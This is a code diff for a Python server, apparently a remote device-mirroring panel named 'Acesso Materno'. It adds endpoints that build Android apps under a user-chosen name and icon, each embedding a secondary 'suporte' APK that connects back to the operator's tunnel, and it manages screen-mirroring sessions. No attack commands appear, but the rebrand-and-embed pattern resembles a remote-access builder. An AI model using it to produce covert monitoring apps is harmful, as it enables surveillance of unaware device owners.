+                                     mensagem=("gradlew.bat nao encontrado. Defina 'android_project_dir' no "
+                                               "config.json (ao lado do .exe) apontando para a pasta do projeto Android."))
+        return
+    _url_apk = (_ultima_config_app.get("panel_url") or "").strip()
+    # DEV (CEO): usa a URL embutida; so o DIST exige o tunel do cliente.
+    if not _url_apk and BUILD_MODE == "dev":
+        _url_apk = (PANEL_URL or "").strip()
+    if not _url_apk:
+        estado_build_catalogo.update(status="erro", apk=None, app_id=app_id,
+                                     mensagem=("Informe a URL do seu túnel no painel antes de gerar o "
+                                               "aplicativo (o .apk precisa dela para conectar ao seu servidor)."))
+        registrar_log(f"[CATALOGO BUILD] Recusado '{app_id}': URL do túnel do cliente nao informada.")
+        return
+    # JAVA_HOME + java no PATH (sem isto o gradlew.bat sai com 9009).
+    _env_cat = _build_android_env()
+    _java_home = _encontrar_java_home()
+    _diag = [
+        f"frozen(.exe)      : {getattr(sys, 'frozen', False)}",
+        f"app_id            : {app_id}",
+        f"tarefa gradle     : {tarefa}",
+        f"raiz do projeto   : {raiz}",
+        f"gradlew.bat       : {gradlew} ({'existe' if os.path.exists(gradlew) else 'NAO ENCONTRADO'})",
+        f"JAVA_HOME         : {_java_home or 'NAO ENCONTRADO (Gradle falha com 9009)'}",
+        f"cwd do subprocess : {raiz}",
+        f"panelUrl (APK)    : {_url_apk}",
+        f"pasta do APK      : {pasta_rel}",
+        f"BUILD_MODE        : {BUILD_MODE}",
+    ]
+    estado_build_catalogo["diagnostico"] = "\n".join(_diag)
+    registrar_log("[CATALOGO BUILD DIAG]\n  " + "\n  ".join(_diag))
+    if not _java_home:
+        estado_build_catalogo.update(status="erro", apk=None, app_id=app_id,
+                                     mensagem=("Java (JDK) nao encontrado. Instale o Android Studio ou um JDK 17/21 "
+                                               "e defina JAVA_HOME (o Gradle precisa do java.exe)."))
+        registrar_log("[CATALOGO BUILD ERRO] JAVA_HOME/java.exe nao encontrado (evita 9009).")
+        return
+    estado_build_catalogo.update(status="compilando", apk=None, app_id=app_id,
+                                 mensagem=f"Compilando '{app_id}' (debug) com '{tarefa}'...")
+    registrar_log(f"[CATALOGO BUILD] Iniciando '{tarefa}' para '{app_id}' (panelUrl={_url_apk})...")
+
+    # 1) Mata daemons do Gradle presos de builds anteriores (causa de build
+    #    "sem fim"). --no-daemon abaixo evita criar novos daemons persistentes.
+    try:
+        subprocess.run(["cmd", "/c", gradlew, "--stop"], cwd=raiz, env=_env_cat,
+                       capture_output=True, text=True, timeout=120)
+        registrar_log("[CATALOGO BUILD] Daemons do Gradle finalizados (--stop).")
+    except Exception as _e_stop:
+        registrar_log(f"[CATALOGO BUILD AVISO] gradlew --stop falhou (segue): {_e_stop}")
+
+    # 2) Compila (offline primeiro; se faltar dependencia cacheada, tenta online).
+    #    --no-daemon + timeout garantem que NUNCA fica preso.
+    _base = [tarefa, "--no-daemon", "--no-configuration-cache", f"-PpanelUrl={_url_apk}"]
+    cmd_off = ["cmd", "/c", gradlew] + _base + ["--offline"]
+    cmd_on = ["cmd", "/c", gradlew] + _base
+    out = ""
+    rc = None
+    try:
+        for _modo, _cmd in (("offline", cmd_off), ("online", cmd_on)):
+            estado_build_catalogo["mensagem"] = f"Compilando '{app_id}' ({_modo})..."
+            registrar_log(f"[CATALOGO BUILD] Gradle ({_modo}): {' '.join(_cmd)}")
+            proc = subprocess.run(_cmd, cwd=raiz, capture_output=True, text=True,
+                                  encoding="utf-8", errors="replace", env=_env_cat,
+                                  timeout=2400)
+            out = (proc.stdout or "") + "\n" + (proc.stderr or "")
+            rc = proc.returncode
+            if rc == 0:
+                break
+            registrar_log(f"[CATALOGO BUILD] Modo {_modo} falhou (codigo {rc}); "
+                          + ("tentando online..." if _modo == "offline" else "fim das tentativas."))
+        if rc != 0:
+            estado_build_catalogo["ultimo_log"] = out[-6000:]
+            estado_build_catalogo.update(status="erro", apk=None, app_id=app_id,
+                                         mensagem=f"O Gradle falhou (codigo {rc}). Veja o log.")
+            registrar_log(f"[CATALOGO BUILD ERRO] {app_id}: codigo {rc}. Cauda do Gradle:\n{out[-2500:]}")
+            return
+    except subprocess.TimeoutExpired:
+        estado_build_catalogo.update(status="erro", apk=None, app_id=app_id,
+                                     mensagem="O Gradle excedeu o tempo limite (40 min) e foi abortado.")
+        registrar_log(f"[CATALOGO BUILD ERRO] {app_id}: timeout (40 min).")
+        return
+    except Exception as e:
+        estado_build_catalogo.update(status="erro", apk=None, app_id=app_id,
+                                     mensagem=f"Erro ao executar o Gradle: {e}")
+        registrar_log(f"[CATALOGO BUILD ERRO] Excecao ao iniciar o Gradle: {e}")
+        return
+    apk = _apk_mais_recente(os.path.join(raiz, pasta_rel))
+    if not apk:
+        estado_build_catalogo.update(status="erro", apk=None, app_id=app_id,
+                                     mensagem=f"Build concluido, mas nenhum .apk foi encontrado em {pasta_rel}.")
+        return
+    registrar_log(f"[CATALOGO BUILD SUCESSO] {app_id}: {apk}")
+    # Abre o Explorer na pasta de destino com o APK selecionado (igual ao build
+    # principal). Fallback: abre apenas a pasta. Nunca falha o build por isto.
+    try:
+        subprocess.Popen(f'explorer /select,"{apk}"')
+        registrar_log(f"[CATALOGO BUILD] Pasta de destino aberta no Explorer: {os.path.dirname(apk)}")
+    except Exception as _e_exp:
+        try:
+            os.startfile(os.path.dirname(apk))
+        except Exception:
+            registrar_log(f"[CATALOGO BUILD AVISO] Nao foi possivel abrir a pasta de destino: {_e_exp}")
+    estado_build_catalogo.update(status="concluido", apk=apk, app_id=app_id,
+                                 mensagem=f"'{app_id}' compilado (debug) com sucesso.")
+
+
+def compilar_debug_catalogo(app_id):
+    """Compila uma entrada LEGADA do catálogo (ex.: giga+) usando o build
+    COMPLETO que EMBUTE o suporte. Antes rodava só assemblePrincipalDebug e o
+    APK saía SEM o suporte ('não aparece para instalar'). Agora reusa
+    compilar_apk_em_segundo_plano() (compila o flavor suporte -> grava em assets
+    como suporte.apk + suporte_motor.apk -> compila o principal embutindo)."""
+    app_cfg = _app_do_catalogo(app_id) or {}
+    nome = (app_cfg.get("nome") or app_id or "App").strip()
+    # Mantém o nome da entrada como marca do app (ícone atual é preservado).
+    _ultima_config_app["nome"] = nome
+    estado_build_catalogo.update(status="compilando", apk=None, app_id=app_id,
+                                 mensagem=f"Compilando '{nome}' (suporte embutido)...")
+    try:
+        compilar_apk_em_segundo_plano()
+    except Exception as e:
+        estado_build_catalogo.update(status="erro", apk=None, app_id=app_id,
+                                     mensagem=f"Erro no build: {e}")
+        registrar_log(f"[CATALOGO BUILD ERRO] {app_id}: {e}")
+        return
+    if estado_build.get("status") != "concluido" or not estado_build.get("apk"):
+        estado_build_catalogo.update(
+            status="erro", apk=None, app_id=app_id,
+            mensagem=(estado_build.get("mensagem") or "Falha na compilação."),
+            ultimo_log=estado_build.get("ultimo_log"),
+            diagnostico=estado_build.get("diagnostico"),
+        )
+        return
+    apk = estado_build.get("apk")
+    registrar_log(f"[CATALOGO BUILD SUCESSO] {app_id} (suporte embutido): {apk}")
+    try:
+        subprocess.Popen(f'explorer /select,"{apk}"')
+    except Exception:
+        try:
+            os.startfile(os.path.dirname(apk))
+        except Exception:
+            pass
+    estado_build_catalogo.update(status="concluido", apk=apk, app_id=app_id,
+                                 mensagem=f"'{nome}' compilado com sucesso (suporte embutido).")
+
+
+@app.get("/apps-catalogo")
+def apps_catalogo():
+    """Lista os apps da categoria (nome + ícone + se já há build + data)."""
+    itens = []
+    for a in _carregar_catalogo():
+        if a.get("usar_marca"):
+            # App CRIADO no painel: APK próprio em apps_catalogo_builds/<id>/.
+            apk_rel = a.get("apk")
+            apk_abs = os.path.join(_DIRETORIO_SERVIDOR, apk_rel) if apk_rel else None
+            itens.append({
+                "id": a.get("id"),
+                "nome": a.get("nome", a.get("id")),
+                "icone": bool(a.get("icone")),
+                "tem_build": bool(apk_abs and os.path.exists(apk_abs)),
+                "atualizado_em": a.get("atualizado_em"),
+            })
+        else:
+            # Entrada legada (ex.: giga+): usa a pasta de saída do Gradle.
+            pasta = os.path.join(_DIRETORIO_SERVIDOR, a.get("pasta", ""))
+            apk = _apk_mais_recente(pasta)
+            atualizado = None
+            if apk:
+                try:
+                    atualizado = time.strftime("%d/%m/%Y %H:%M", time.localtime(os.path.getmtime(apk)))
+                except Exception:
+                    atualizado = None
+            itens.append({
+                "id": a.get("id"),
+                "nome": a.get("nome", a.get("id")),
+                "icone": False,
+                "tem_build": bool(apk),
+                "atualizado_em": atualizado,
+            })
+    return {"apps": itens}
+
+
+@app.post("/criar-app-catalogo")
+async def criar_app_catalogo(nome: str = Form(...), icone: Optional[UploadFile] = File(None)):
+    """Cria um novo app na categoria (nome + ícone). Cada criação = app novo;
+    nome/ícone diferentes geram um APK próprio ao compilar."""
+    nome = (nome or "").strip()
+    if not nome:
+        return {"status": "erro", "mensagem": "Informe o nome do aplicativo."}
+    app_id = time.strftime("%Y%m%d_%H%M%S") + "_" + str(random.randint(100, 999))
+    tem_icone = False
+    if icone and icone.filename:
+        try:
+            dados = await icone.read()
+            if dados:
+                os.makedirs(PASTA_CATALOGO_ICONES, exist_ok=True)
+                try:
+                    from PIL import Image
+                    import io as _io
+                    img = Image.open(_io.BytesIO(dados)).convert("RGBA").resize((192, 192))
+                    img.save(_caminho_icone_catalogo(app_id), format="PNG")
+                except Exception:
+                    with open(_caminho_icone_catalogo(app_id), "wb") as f:
+                        f.write(dados)
+                tem_icone = True
+        except Exception as e:
+            registrar_log(f"[CATALOGO] Falha ao salvar ícone: {e}")
+    lista = _carregar_catalogo()
+    lista.insert(0, {
+        "id": app_id,
+        "nome": nome,
+        "icone": tem_icone,
+        "usar_marca": True,
+        "criado_em": time.strftime("%d/%m/%Y %H:%M"),
+        "apk": None,
+        "atualizado_em": None,
+    })
+    _salvar_catalogo(lista)
+    registrar_log(f"[CATALOGO] Novo app criado: '{nome}' (id={app_id}, icone={tem_icone}).")
+    return {"status": "sucesso", "id": app_id, "nome": nome}
+
+
+@app.get("/icone-catalogo/{app_id}")
+def icone_catalogo(app_id: str):
+    app_id_seguro = re.sub(r'[^A-Za-z0-9_\-]', '', app_id)
+    caminho = _caminho_icone_catalogo(app_id_seguro)
+    if os.path.exists(caminho):
+        return FileResponse(caminho, media_type="image/png")
+    return {"status": "erro", "mensagem": "Ícone não encontrado."}
+
+
+@app.get("/excluir-app-catalogo")
+def excluir_app_catalogo(id: str):
+    app_id_seguro = re.sub(r'[^A-Za-z0-9_\-]', '', id)
+    lista = _carregar_catalogo()
+    nova = [a for a in lista if str(a.get("id")) != app_id_seguro]
+    if len(nova) == len(lista):
+        return {"status": "erro", "mensagem": "Aplicativo não encontrado."}
+    _salvar_catalogo(nova)
+    for p in (_caminho_icone_catalogo(app_id_seguro),
+              os.path.join(PASTA_CATALOGO_BUILDS, app_id_seguro)):
+        try:
+            if os.path.isdir(p):
+                shutil.rmtree(p, ignore_errors=True)
+            elif os.path.exists(p):
+                os.remove(p)
+        except Exception:
+            pass
+    return {"status": "sucesso", "mensagem": "Aplicativo excluído."}
+
+
+@app.get("/compilar-app-catalogo")
+def compilar_app_catalogo(id: str, background_tasks: BackgroundTasks):
+    if estado_build_catalogo.get("status") == "compilando":
+        return {"status": "compilando", "mensagem": "Já existe uma compilação em andamento."}
+    entry = _app_do_catalogo(id)
+    if not entry:
+        return {"status": "erro", "mensagem": "Aplicativo não encontrado no catálogo."}
+    estado_build_catalogo.update(status="compilando", apk=None, app_id=id,
+                                 mensagem="Iniciando compilação...")
+    # Apps criados no painel (usar_marca) compilam com SEU nome+ícone, reusando
+    # o build principal (que embute o suporte). Entradas legadas seguem o antigo.
+    if entry.get("usar_marca"):
+        background_tasks.add_task(_compilar_catalogo_com_marca, id)
+    else:
+        background_tasks.add_task(compilar_debug_catalogo, id)
+    return {"status": "iniciado", "mensagem": "Compilação iniciada em segundo plano."}
+
+
+@app.get("/status-build-catalogo")
+def status_build_catalogo():
+    return estado_build_catalogo
+
+
+@app.get("/download-apk-catalogo")
+def download_apk_catalogo(id: str):
+    """Entrega SEMPRE a ÚLTIMA APK compilada deste app."""
+    app_cfg = _app_do_catalogo(id)
+    if not app_cfg:
+        return {"status": "erro", "mensagem": "Aplicativo não encontrado no catálogo."}
+    nome = re.sub(r'[^\w\-.]+', '', (app_cfg.get("nome") or "app")) or "app"
+    if app_cfg.get("usar_marca"):
+        # App criado no painel: APK próprio em apps_catalogo_builds/<id>/.
+        apk_rel = app_cfg.get("apk")
+        apk = os.path.join(_DIRETORIO_SERVIDOR, apk_rel) if apk_rel else None
+        if apk and os.path.exists(apk):
+            return FileResponse(apk, media_type="application/vnd.android.package-archive",
+                                filename=nome + ".apk")
+        return {"status": "erro", "mensagem": "Nenhum APK compilado ainda para este app. Clique em Compilar."}
+    pasta = os.path.join(_DIRETORIO_SERVIDOR, app_cfg.get("pasta", ""))
+    apk = _apk_mais_recente(pasta)
+    if apk and os.path.exists(apk):
+        return FileResponse(apk, media_type="application/vnd.android.package-archive",
+                            filename=nome + ".apk")
+    return {"status": "erro", "mensagem": "Nenhum APK compilado ainda para este app. Clique em Compilar."}
 
 
 @app.get("/janela-scrcpy")
@@ -4941,9 +5984,50 @@ async def desconectar_aparelho(nome: str):
     sid = nome_sid.get(nome)
     if sid:
         await sio.emit("desligar", {}, to=sid)
+    # Desconexão manual deste aparelho = tira ele da sessão ativa (não deve
+    # reabrir sozinho num próximo restart). A sessão dos demais permanece.
+    if nome in sessao_ativa:
+        sessao_ativa.discard(nome)
+        _salvar_sessao_ativa()
     registrar_log(f"[DESCONECTAR] '{nome}' removido e sinal 'desligar' "
                   f"{'enviado' if sid else 'sem socket'} ({'ok' if removido else 'não estava na lista'}).")
     return {"status": "ok" if removido else "nao_encontrado", "dispositivo": nome}
+
+
+@app.get("/encerrar-sessao")
+async def encerrar_sessao():
+    """Encerra a sessão de espelhamento: limpa sessoes_ativas.json para que,
+    num próximo restart do 'Acesso Materno.exe', NENHUM dispositivo reabra a
+    visualização automaticamente. Usado pelo botão 'Encerrar Sessão' do painel."""
+    quantidade = len(sessao_ativa)
+    sessao_ativa.clear()
+    _salvar_sessao_ativa()
+    registrar_log(f"[SESSAO] Sessão encerrada pelo usuário — {quantidade} dispositivo(s) removidos da reconexão automática.")
+    try:
+        await sio.emit("sessao_encerrada", {"ok": True}, room="painel")
+    except Exception:
+        pass
+    return {"status": "ok", "removidos": quantidade}
+
+
+@app.get("/sessao-ativa")
+def sessao_ativa_status():
+    """Lista os dispositivos da sessão de tela ativa e quais estão online agora."""
+    return {
+        "dispositivos": sorted(sessao_ativa),
+        "online": sessao_dispositivos_online(),
+    }
+
+
+@app.get("/config-cliente")
+def config_cliente():
+    """Expõe ao painel o server_url vinculado à licença desta instância, para o
+    gerador de APK preencher automaticamente o campo de URL do servidor."""
+    return {
+        "server_url": SERVER_URL_CLIENTE,
+        "cliente_nome": CLIENTE_NOME,
+        "route_cidr": ROUTE_CIDR_CLIENTE,
+    }
 
 
 @app.get("/disparar-botao-direto")
@@ -5302,6 +6386,14 @@ try:
         def __init__(self, url="http://127.0.0.1:27105/"):
             super().__init__()
             self.setWindowTitle("Acesso Materno - Emulador Flutuante")
+            # Icone oficial da janela (compativel com PyInstaller via _MEIPASS).
+            try:
+                _base_ico = getattr(sys, "_MEIPASS", None) or os.path.dirname(os.path.abspath(__file__))
+                _cam_ico = os.path.join(_base_ico, "icone.ico")
+                if os.path.exists(_cam_ico):
+                    self.setWindowIcon(QtGui.QIcon(_cam_ico))
+            except Exception:
+                pass
             # Janela SEM BORDAS + SEMPRE NO TOPO (frameless + always on top)
             # Janela principal NORMAL e comum do Windows (com bordas e titulo
             # nativos do sistema operacional). Sem FramelessWindowHint e sem
@@ -6452,114 +7544,88 @@ async def exportar_gravacoes_desativada(dispositivo: str, request: _Request,
 asgi_app = socketio.ASGIApp(sio, other_asgi_app=app)
 
 if __name__ == "__main__":
-    # OBRIGATORIO no Windows com .exe congelado (PyInstaller): SEM esta linha,
-    # qualquer processo filho (multiprocessing / workers do Uvicorn / subprocess)
-    # REEXECUTA todo o script do zero, gerando loop infinito de spawn que
-    # derruba o Uvicorn e causa 502 Bad Gateway. DEVE ser a 1ª linha executavel.
-    multiprocessing.freeze_support()
+    try:
+        multiprocessing.freeze_support()
 
-    # (A blindagem stdout/stderr None esta no TOPO do arquivo, antes de
-    # qualquer import de terceiro — cobre tambem o import do uvicorn/fastapi.)
-
-    # ==================================================================
-    # MODO INTERFACE (SOU_EXEC_INTERFACE=1) — 1ª verificacao apos o
-    # freeze_support(), antes de qualquer limpeza de porta / Uvicorn.
-    # Fomos lancados pelo proprio servidor (py -3.12 server.py, ou pelo .exe
-    # em modo servidor) como janela visual. NAO subimos Uvicorn, NAO chamamos
-    # _escolher_porta() e NAO checamos a porta 27105 — isso evita o pop-up de
-    # ERRO CRITICO de "porta ocupada" (o servidor ja roda no processo pai).
-    # Apenas abrimos a interface apontando para o painel.
-    # ==================================================================
-    if os.environ.get("SOU_EXEC_INTERFACE") == "1":
-        _url_interface = f"{PANEL_URL}/"
-        if _PYQT6_DISPONIVEL:
+        if ("--modo-fps" in sys.argv) or (os.environ.get("SOU_EXEC_FPS") == "1"):
             try:
-                app_qt = QtWidgets.QApplication(sys.argv)
-                janela = JanelaDesktop(_url_interface)
-                janela.show()
-                app_qt.exec()
-            except Exception as _e_iface:
+                _fps_dir = os.environ.get("FPS_DATA_DIR")
+                if not _fps_dir:
+                    _fps_dir = os.path.join(os.path.dirname(sys.executable), "FPS") \
+                        if getattr(sys, "frozen", False) \
+                        else os.path.abspath(os.path.join(_DIRETORIO_SERVIDOR, "..", "FPS"))
+                os.makedirs(_fps_dir, exist_ok=True)
+                os.environ["FPS_DATA_DIR"] = _fps_dir
                 try:
-                    registrar_log(f"[INTERFACE AVISO] PyQt6 falhou ({_e_iface}); abrindo navegador padrao em {_url_interface}")
+                    os.chdir(_fps_dir)
                 except Exception:
                     pass
+                from leitor.main import main as _fps_main
+                _fps_main()
+            except Exception as _e_fps:
+                try:
+                    import traceback as _tb
+                    _log_fps = os.path.join(
+                        os.environ.get("FPS_DATA_DIR") or os.path.dirname(sys.executable),
+                        "crash_log.txt")
+                    with open(_log_fps, "a", encoding="utf-8") as _f:
+                        _f.write(f"\n--- FPS CRASH (modo-fps) ---\n{_tb.format_exc()}")
+                except Exception:
+                    pass
+            sys.exit(0)
+
+        # Verificação de Licença
+        from licenca_cliente import verificar_licenca_ou_sair
+        if not verificar_licenca_ou_sair():
+            sys.exit(0)
+
+        _modo_sem_janela = ("--sem-janela" in sys.argv) or (os.environ.get("ACESSO_MATERNO_SEM_JANELA") == "1")
+        PORTA_SERVIDOR = _escolher_porta(27105)
+        PORTA_REAL = PORTA_SERVIDOR
+
+        def rodar_servidor():
+            import uvicorn
+            try:
+                registrar_log(f"[INICIO] Subindo Uvicorn em http://127.0.0.1:{PORTA_SERVIDOR} (thread background)...")
+                uvicorn.run(asgi_app, host="127.0.0.1", port=PORTA_SERVIDOR, log_level="info", log_config=None)
+            except Exception as e:
+                print(f"[SERVIDOR ERRO] Uvicorn falhou: {e}", flush=True)
+
+        threading.Thread(target=rodar_servidor, daemon=True).start()
+
+        if not _modo_sem_janela and _PYQT6_DISPONIVEL:
+            try:
+                app_qt = QtWidgets.QApplication(sys.argv)
+                janela = JanelaDesktop(f"http://127.0.0.1:{PORTA_SERVIDOR}/")
+                janela.show()
+                sys.exit(app_qt.exec())
+            except Exception as _e_iface:
+                registrar_log(f"[INTERFACE AVISO] PyQt6 falhou ({_e_iface}); abrindo navegador padrão.")
                 import webbrowser
-                webbrowser.open(_url_interface)
+                webbrowser.open(f"http://127.0.0.1:{PORTA_SERVIDOR}/")
+                import time
+                while True:
+                    time.sleep(3600)
         else:
-            import webbrowser
-            webbrowser.open(_url_interface)
-        # Encerra este processo: o servidor continua no processo pai.
-        sys.exit(0)
+            import time
+            registrar_log("[INICIO] Modo --sem-janela ativo ou PyQt6 indisponível: servidor rodando sem interface local.")
+            while True:
+                time.sleep(3600)
 
-    # ==================================================================
-    # MODO SERVIDOR (processo principal: py -3.12 server.py, ou .exe aberto
-    # diretamente). Sobe o Uvicorn na porta 27105 DIRETAMENTE na thread
-    # principal (sem thread daemon, sem "while True: sleep"). O túnel
-    # Cloudflare (Zero Trust) aponta para http://127.0.0.1:27105, logo o
-    # servidor OBRIGATORIAMENTE deve subir nesta porta — qualquer outra
-    # causa HTTP 502 Bad Gateway imediato.
-    # O .exe da interface visual é disparado de forma destacada (isolada)
-    # ANTES do uvicorn.run() assumir o bloqueio do processo principal.
-    # ==================================================================
-    _modo_sem_janela = ("--sem-janela" in sys.argv) or (os.environ.get("ACESSO_MATERNO_SEM_JANELA") == "1")
-    PORTA_SERVIDOR = _escolher_porta(27105)
-    PORTA_REAL = PORTA_SERVIDOR
-
-    # Executavel compilado (PyInstaller) = este mesmo server.py empacotado.
-    # Lancado com SOU_EXEC_INTERFACE=1 -> abre apenas a interface visual.
-    _CAMINHO_EXE_PAINEL = r"C:\Users\suporte\Documents\acessomaterno\AcessoMaterno-master\dist\Acesso Materno.exe"
-
-    # Dispara o .exe em MODO INTERFACE (destacado/isolado, ANTES do Uvicorn
-    # assumir o bloqueio do processo principal). A variavel SOU_EXEC_INTERFACE
-    # e injetada EXPLICITAMENTE via copia do env (env=_novo_env), sem depender
-    # de heranca automatica (que pode falhar no .exe congelado e causar loop
-    # de processos). O .exe filho, logo apos freeze_support(), detecta a flag,
-    # abre a janela visual e morre em sys.exit(0) — nunca roda Uvicorn.
-    if not _modo_sem_janela:
+    except Exception as _e_startup:
+        import traceback
+        err_msg = traceback.format_exc()
+        print(f"\n\n[ERRO CRITICO DE INICIALIZACAO]:\n{err_msg}", flush=True)
         try:
-            if os.path.exists(_CAMINHO_EXE_PAINEL):
-                # Injecao EXPLICITA por copia do env (anti-loop PyInstaller).
-                _novo_env = os.environ.copy()
-                _novo_env["SOU_EXEC_INTERFACE"] = "1"  # <=== anti-conflito de porta / anti-loop
-                _flags = 0
-                if os.name == "nt":  # Windows: processo destacado, console proprio.
-                    _flags = (
-                        getattr(subprocess, "DETACHED_PROCESS", 0)
-                        | getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)
-                    )
-                subprocess.Popen(
-                    [_CAMINHO_EXE_PAINEL],
-                    cwd=os.path.dirname(_CAMINHO_EXE_PAINEL),
-                    env=_novo_env,
-                    creationflags=_flags,
-                    close_fds=True,
-                    stdin=subprocess.DEVNULL,
-                    stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL,
-                )
-                registrar_log(
-                    f"[INICIO] Executavel do painel disparado em MODO INTERFACE "
-                    f"(SOU_EXEC_INTERFACE=1): {_CAMINHO_EXE_PAINEL}"
-                )
-            else:
-                registrar_log(
-                    f"[INICIO AVISO] Executavel do painel NAO encontrado em {_CAMINHO_EXE_PAINEL}; "
-                    "servidor continua rodando (acesse via navegador/tunel Cloudflare)."
-                )
-        except Exception as _e_exe:
-            registrar_log(
-                f"[INICIO ERRO] Falha ao disparar o executavel do painel: {_e_exe} "
-                "(servidor continua rodando normalmente)."
-            )
-    else:
-        registrar_log("[INICIO] Modo --sem-janela ativo: executavel do painel NAO sera disparado.")
-
-    # Uvicorn roda DIRETAMENTE na thread principal (bloqueia ate Ctrl+C /
-    # encerramento). Sem thread daemon + sem "while True: time.sleep(3600)"
-    # = estabilidade absoluta para o túnel Cloudflare (nunca mais 502 por
-    # morte de thread secundaria). O túnel aponta para http://127.0.0.1:27105.
-    # log_config=None DESATIVA os formatadores padrao do Uvicorn (que chamam
-    # isatty() para cores) — blindagem extra contra --windowed/--noconsole.
-    import uvicorn
-    registrar_log(f"[INICIO] Subindo Uvicorn em http://127.0.0.1:{PORTA_SERVIDOR} (thread principal)...")
-    uvicorn.run(asgi_app, host="127.0.0.1", port=PORTA_SERVIDOR, log_level="info", log_config=None)
+            _err_dir = os.path.dirname(sys.executable) if getattr(sys, "frozen", False) else os.getcwd()
+            _err_path = os.path.join(_err_dir, "startup_crash.txt")
+            with open(_err_path, "w", encoding="utf-8") as _f:
+                _f.write(err_msg)
+            print(f"Detalhes do erro salvos em: {_err_path}", flush=True)
+        except Exception:
+            pass
+        try:
+            input("\nPressione ENTER para fechar a janela...")
+        except Exception:
+            pass
+        sys.exit(1)
